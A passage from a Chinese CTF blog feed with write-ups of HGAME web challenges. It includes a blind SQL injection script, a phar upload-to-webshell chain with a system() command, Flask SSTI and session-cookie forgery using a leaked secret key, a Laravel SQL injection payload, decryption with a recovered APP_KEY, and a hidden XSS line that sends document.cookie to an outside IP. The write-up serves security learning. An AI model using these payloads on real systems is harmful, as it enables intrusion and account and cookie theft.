class="number">61</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'token'</span>] = $token;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;input type='hidden' value='$token' id='token'&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">res_to_json</span><span class="params">($res, $type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $json[<span class="string">'type'</span>] = $type;</span><br><span class="line">    $json[<span class="string">'status'</span>] = <span class="string">"true"</span>;</span><br><span class="line">    $json[<span class="string">"content"</span>] = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($res <span class="keyword">as</span> $message) &#123;</span><br><span class="line"></span><br><span class="line">        $array_tmp[<span class="string">'user_id'</span>] = $message[<span class="string">'user_id'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'user'</span>] = $message[<span class="string">'user'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'avatar'</span>] = get_avatar($message[<span class="string">'user_id'</span>]) != <span class="keyword">null</span> ? get_avatar($message[<span class="string">'user_id'</span>])[<span class="string">'content'</span>] : md5($message[<span class="string">'user'</span>]);</span><br><span class="line">        $array_tmp[<span class="string">'message'</span>] = $message[<span class="string">'content'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'message_id'</span>] = $message[<span class="string">'message_id'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'time'</span>] = $message[<span class="string">'date'</span>];</span><br><span class="line">        array_push($json[<span class="string">"content"</span>], $array_tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    $json[<span class="string">"content"</span>] = $json[<span class="string">"content"</span>];</span><br><span class="line">    <span class="keyword">return</span> json_encode($json);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span><span class="params">($username, $password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username's length error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (strlen($password) &lt; <span class="number">6</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"password's length error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (judge($username, $password) == <span class="number">1</span> <span class="keyword">and</span> $token === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        $password = md5($password);</span><br><span class="line">        $sql_query = <span class="string">"insert into `users`(`username`,`password`) VALUES ('$username','$password')"</span>;</span><br><span class="line">        $res = sql_query($sql_query);</span><br><span class="line">        <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'register success!'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) <span class="keyword">and</span> $token === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        $password = md5($password);</span><br><span class="line">        $sql_query = <span class="string">"select * from `users` where `username`='$username' and `password`='$password'"</span>;</span><br><span class="line">        $res = sql_query($sql_query);</span><br><span class="line">        <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">            $data = $res-&gt;fetch_array();</span><br><span class="line">            $_SESSION[<span class="string">'user_id'</span>] = $data[<span class="string">'user_id'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'user'</span>] = $data[<span class="string">'username'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'groups'</span>] = $data[<span class="string">'groups'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">            setcookie(<span class="string">'user'</span>, $_SESSION[<span class="string">'user'</span>]);</span><br><span class="line">            setcookie(<span class="string">'groups'</span>, $_SESSION[<span class="string">'groups'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loginout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'loginout'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        session_destroy();</span><br><span class="line">        setcookie(<span class="string">'groups'</span>, <span class="keyword">null</span>);</span><br><span class="line">        setcookie(<span class="string">'user'</span>, <span class="keyword">null</span>);</span><br><span class="line">        Header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_avatar</span><span class="params">($user_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sql_query = <span class="string">"select `avatar` from `users` where `user_id`=$user_id"</span>;</span><br><span class="line">    $res = sql_query($sql_query)-&gt;fetch_row()[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span> =&gt; $res, <span class="string">'content'</span> =&gt; base64_encode(file_get_contents(<span class="string">'./img/avatar/'</span> . $res . <span class="string">'.png'</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_new_messages</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = $_GET[<span class="string">'start'</span>] ?? <span class="number">0</span>;</span><br><span class="line">    $start = addslashes($start);</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    $sql_query = <span class="string">"select * from `messages` where `user_id`=$user_id LIMIT $start,999999999999"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> res_to_json($res, <span class="string">"messages"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_messages</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = $_GET[<span class="string">'start'</span>] ?? <span class="number">0</span>;</span><br><span class="line">    $start = addslashes($start);</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    $sql_query = <span class="string">"select * from `messages` where `user_id`=$user_id ORDER BY `message_id` DESC LIMIT $start,12"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> res_to_json($res, <span class="string">"messages"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span><span class="params">($message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) <span class="keyword">and</span> mb_strlen($message) &gt; <span class="number">6</span>) &#123;</span><br><span class="line">            $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">            $user = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">            $sql_query = <span class="string">"insert into `messages`(`user_id`,`user`,`content`) VALUES($user_id,'$user','$message')"</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"login error"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"length error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_message</span><span class="params">($message_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id"</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sql_query($sql_query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_filename</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tmp = `cat /dev/urandom | head -n <span class="number">10</span> | md5sum | head -c <span class="number">15</span>`;</span><br><span class="line">    $sql_query = <span class="string">"select `avatar` from `users` where `avatar`=$tmp"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> rand_filename();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_avatar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $type = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'image/gif'</span> || $type == <span class="string">'image/jpeg'</span> || $type == <span class="string">'image/png'</span>) &#123;</span><br><span class="line">        $avatar = get_avatar($user_id);</span><br><span class="line">        <span class="keyword">if</span> ($avatar == <span class="keyword">null</span>) &#123;</span><br><span class="line">            $name = rand_filename();</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">"./img/avatar/"</span> . $name . <span class="string">".png"</span>);</span><br><span class="line">            $sql_query = <span class="string">"update `users` set `avatar`='$name' WHERE `user_id`=$user_id"</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">"./img/avatar/"</span> . $avatar[<span class="string">'name'</span>] . <span class="string">".png"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change_password</span><span class="params">($opassword, $npassword, $npasswod_again)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (judge($_SESSION[<span class="string">'user'</span>], $npassword)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($npasswod_again !== $npassword) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"difference error"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">            $sql_query = <span class="string">"select `password` from `users` where `user_id`=$user_id"</span>;</span><br><span class="line">            $res = sql_query($sql_query);</span><br><span class="line">            <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($res-&gt;fetch_row()[<span class="number">0</span>] === md5($opassword)) &#123;</span><br><span class="line">                    $sql_query = <span class="string">"update `users` set `password`=md5($npassword) WHERE `user_id`=$user_id"</span>;</span><br><span class="line">                    $res = sql_query($sql_query);</span><br><span class="line">                    <span class="keyword">echo</span> $res;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"oldpassword error"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>审计代码可知，存在一处图片上传，但是不知道文件名，题目中有很多sql语句，都用addslashes()函数转义过了，字符型注入无法实施，但是在delete_message中存在数字型注入<code>$sql_query = “delete from <code>messages</code> where <code>message_id</code>=$message_id and <code>user_id</code>=$user_id”;</code>，参数可控且没有单引号（addslashes()过滤无效），我们可以通过时间盲注来获取我们当前用户对应的文件名，token是一次一刷新，需要每次都获取，代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">"groups"</span>:<span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"PHPSESSID"</span>:<span class="string">"c419fq3ppu11r1o2tra4l9rlnm"</span>,</span><br><span class="line">    <span class="string">"user"</span>:<span class="string">"snowtest"</span></span><br><span class="line">&#125;</span><br><span class="line">url_del = <span class="string">'http://111.231.140.29:10080/messages_api.php?action=delete'</span></span><br><span class="line">url = <span class="string">'http://111.231.140.29:10080/index.php?action=message'</span></span><br><span class="line">message = <span class="string">"7469 and if(ascii((substr((select avatar from users where username like 0x736e6f777425 limit 1),&#123;&#125;,1)))=&#123;&#125;,sleep(5),0)#"</span></span><br><span class="line">avatar = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">127</span>):</span><br><span class="line">        r = requests.get(url,cookies=cookies)</span><br><span class="line">        token = re.findall(<span class="string">r"value='(.*)' id='token'&gt;"</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        data = dict(token=token,message_id=message.format(i,j))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url_del,cookies=cookies,data=data,timeout=<span class="number">4</span>)  </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            avatar += chr(j)</span><br><span class="line">            print(avatar)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>可以得到我的账号对应的文件名为<code>1bce72251d3c333</code>，在upload_avatar()中会在文件名后面强行拼接png后缀<code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;./img/avatar/&quot; . $name . &quot;.png&quot;);</code>，也就是最终上传的文件名会被命名为<code>1bce72251d3c333.png</code>，如果直接写入shell肯定是无法执行的，不过前面我们读源码的时候利用了<code>require $page .&#39;.php&#39;;</code>，所以我们可以利用phar协议来getshell，在本地写一个shell，然后打包为zip文件，修改文件头并上传</p><p><img src="https://i.loli.net/2019/02/19/5c6bdd1d45b16.png" alt=""><br>然后上传，之后访问<code>http://111.231.140.29:10080/index.php?action=phar://img/avatar/1bce72251d3c333.png/shell</code>即可getshell</p><p>然后就是文件探测了，可以使用find命令<code>snow=system(&#39;find / -name &quot;*flag*&quot;&#39;);</code>，最终payload</p><p><img src="https://i.loli.net/2019/02/19/5c6bde110e9a2.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;e4616b38e22d1a22cedc53a90cfaa87f75ccbfe565399857a390950a58a94e68&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyXss"><a href="#BabyXss" class="headerlink" title="BabyXss"></a>BabyXss</h2><p>题目环境有点问题</p><!-- <scr<script>ipt>$.get('http://120.77.176.134/?cookie=' + document.cookie);</scr<script>ipt> --><h1 id="WEEK-4"><a href="#WEEK-4" class="headerlink" title="WEEK-4"></a>WEEK-4</h1><h2 id="happypython"><a href="#happypython" class="headerlink" title="happypython"></a>happypython</h2><p>python下的ssti，自己当时做的时候想到了要获取secret_key的思路，但是可惜没想到ssti，自己对框架相关问题了解的太少了，以后要在这方面加强一下，简单测试一下可以发现该框架是存在模板注入的问题的<code>http://118.25.18.223:3001/{{1+1}}</code></p><p><img src="https://i.loli.net/2019/02/26/5c7529f34783c.png" alt=""></p><p>接下来读取配置文件<code>http://118.25.18.223:3001/{{config}}</code>，可以获取到secret_key</p><p><img src="https://i.loli.net/2019/02/26/5c752a50e3200.png" alt=""></p><p>解一下cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session.py decode -c .eJwlj0FqQzEMBe_idRaSLMl2LvORZYmGQAv_J6vSu8fQ1ayGee-3HHnG9VXur_Mdt3I8VrkXEETAdKvkc1EbK5fG0D4oXKR3DND0qSbUGy1gHwTeONI8RxCLVOWuWmU2iC27qzNrwuSKCpDTbCipEfQxyY3Fos2-nGKWW_HrzOP184zvvUexCUtm3wzlXRAbKQwzrCOtMJJel2zvfcX5fwIRy98HJ4Y_iA.XHUmGA.wO2v6jNOPBHknlA5tAqik2bE_hI -s 9RxdzNwq7!nOoK3*</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;u&apos;csrf_token&apos;: u&apos;617545ff8175e64f9e5a9f540bea812dea2583d5&apos;, u&apos;_fresh&apos;: True, u&apos;user_id&apos;: u&apos;111&apos;, u&apos;_id&apos;: u&apos;051101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a2089b2ca45ae7b8dc2eb&apos;&#125;</span><br></pre></td></tr></table></figure><p>猜测user_id可能代表的是用户id，猜测admin的用户ID为1，修改一下id为1伪造cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py encode -s 9Rxdz Nwq7!nOoK3* -t &#123;&apos;csrf_token&apos;:&apos;617545ff8175e64f9e5a9f540bea812dea2583d5&apos;,&apos;_fresh&apos;:True,&apos;user_id&apos;:&apos;1&apos;,&apos;_id&apos;:&apos;0 51101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a208 9b2ca45ae7b8dc2eb&apos;&#125;</span><br></pre></td></tr></table></figure><p>然后将生成的cookie覆盖原来cookie即可得到flag</p><p><img src="https://i.loli.net/2019/02/26/5c752b920389a.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Qu_bu_la1_m1ng_z1_14&#125;</span><br></pre></td></tr></table></figure><p>ps: 这题我入了一个坑点，在伪造cookie的时候，命令行下老是报错<code>ValueError: dictionary update sequence element #0 has length 1; 2 is required</code>，查看了一下代码发现是在dict()函数处报错的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br></pre></td></tr></table></figure><p>但是同样的代码在linux下就可以正常运行，测试了一下发现在windows下dict的参数其实是类似于<code>{aa:aa}</code>，而linux下却是<code>{&#39;aa&#39;:&#39;aa&#39;}</code>，命令行输入是完全相同的，显然windows下的参数无法正确执行，经过研究发现是<code>&quot;</code>捣的鬼，在windows下我们输入的<code>&quot;</code>是不会被捕获的，只会捕获双引号里面的内容，而单引号不存在这个问题，如果想要输入双引号必须要反斜杠转义，举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    print(sys.argv[i])</span><br></pre></td></tr></table></figure><p>我们输入<code>python b.py &quot;key&quot;:&quot;value&quot; &#39;key&#39;:&#39;value&#39; \&quot;\&#39;</code>，此时输出为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b.py</span><br><span class="line">key:value</span><br><span class="line">&apos;key&apos;:&apos;value&apos;</span><br><span class="line">&quot;\&apos;</span><br></pre></td></tr></table></figure></p><p>这就是区别，应该是windows特性的问题，自己被坑了好久还以为自己做的不对（泪奔~~~~~）</p><h2 id="happyPHP"><a href="#happyPHP" class="headerlink" title="happyPHP"></a>happyPHP</h2><p>正常注册之后登录，查看源代码可以得到项目源代码<code>!--https://github.com/Lou00/laravel--&gt;</code></p><p>审计代码时，一般应该从路由开始看起，看一共有哪些页面，实现了哪些功能，对于laraval来说，我们先从routes/web.php开始审计</p><p><img src="https://i.loli.net/2019/02/27/5c75e272afb23.png" alt=""></p><p>可以看到实现的路由，例如对第一行来说，表示的意思就是将根目录发送给StaticPagesController控制器下的home方法进行解析，name方法用来命令路由，便于后期的维护。</p><p>app中的文件是框架的核心控制部分，我们查看一下该部分看看，在SessionController.php中发现了问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Auth::attempt($credentials)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Auth::user()-&gt;id ===<span class="number">1</span>)&#123;</span><br><span class="line">        session()-&gt;flash(<span class="string">'info'</span>,<span class="string">'flag :******'</span>);</span><br><span class="line">        <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $name = DB::select(<span class="string">"SELECT name FROM `users` WHERE `name`='"</span>.Auth::user()-&gt;name.<span class="string">"'"</span>);</span><br><span class="line">    session()-&gt;flash(<span class="string">'info'</span>, <span class="string">'hello '</span>.$name[<span class="number">0</span>]-&gt;name);</span><br><span class="line">    <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到此处存在sql语句，在laraval中有更加安全的sql查询方式，这儿显然存在问题的，存在sql注入问题，我们可以注册一个用户名为<code>&#39; union select group_concat(email,password) from users where id=1#</code>，然后登录即可获得该用户的email和密码（因为题目要求id=1的用户登录才可以得到flag），</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin@hgame.comeyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==</span><br></pre></td></tr></table></figure><p>密码是经过加密的，解密一下</p><blockquote><p>{“iv”:”rnVrqfCvfJgnvSTi9z7KLw==”,”value”:”EaR/4fldOGP1G/aDK8e8u1Aldmxl+yB3s+kBAaoPods=”,”mac”:”56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af”}</p></blockquote><p>查看配置文件可以发现使用了aes加密，但是key值不知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;key&apos; =&gt; env(&apos;APP_KEY&apos;),</span><br><span class="line">&apos;cipher&apos; =&gt; &apos;AES-256-CBC&apos;,</span><br></pre></td></tr></table></figure></p><p>回滚git版本找到key值</p><blockquote><p>APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=</p></blockquote><p>接下来编写解密脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="string">'rnVrqfCvfJgnvSTi9z7KLw=='</span></span><br><span class="line">value = <span class="string">'EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='</span></span><br><span class="line">enc = <span class="string">'9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='</span></span><br><span class="line">enc = base64.b64decode(enc)</span><br><span class="line">iv = base64.b64decode(iv)</span><br><span class="line">value = base64.b64decode(value)</span><br><span class="line">cryptor = AES.new(enc,AES.MODE_CBC,iv)</span><br><span class="line">con = cryptor.decrypt(value)</span><br><span class="line"><span class="keyword">print</span> con</span><br></pre></td></tr></table></figure></p><p>可以得到密码为<code>9pqfPIer0Ir9UUfR</code>，登录即可得到flag</p><p><img src="https://i.loli.net/2019/02/27/5c75f88d0fb45.png" alt=""></p><p><strong><em>Reference：</em></strong></p><ol><li><a href="https://xz.aliyun.com/t/3161" target="_blank" rel="noopener">https://xz.aliyun.com/t/3161</a></li><li><a href="https://zry.io/archives/183" target="_blank" rel="noopener">https://zry.io/archives/183</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;week-3&quot;&gt;&lt;a href=&quot;#week-3&quot; class=&quot;headerlink&quot; title=&quot;week-3&quot;&gt;&lt;/a&gt;week-3&lt;/h1&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>XSS20冲关之旅</title>
    <link href="http://chaosec.top/2019/03/02/xss20/"/>
    <id>http://chaosec.top/2019/03/02/xss20/</id>
    <published>2019-03-01T16:09:49.000Z</published>
    <updated>2019-03-09T03:44:03.523Z</updated>
    
